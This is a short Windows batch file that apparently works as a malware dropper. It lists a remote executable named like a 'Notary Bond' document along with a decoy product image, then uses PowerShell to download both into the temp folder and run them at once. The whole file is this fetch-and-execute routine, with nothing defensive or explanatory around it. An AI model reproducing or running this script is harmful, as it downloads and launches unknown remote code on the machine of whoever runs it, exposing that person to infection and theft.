@echo off

set files='https://cdn.sql.gg/pDZZtKAOxBGJlAKMfTdP-elwJkrkce8e/Notary%20Bond%202.24.2021.exe','https://i2.rozetka.ua/goods/18374833/216571009_images_18374833963.jpg'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"



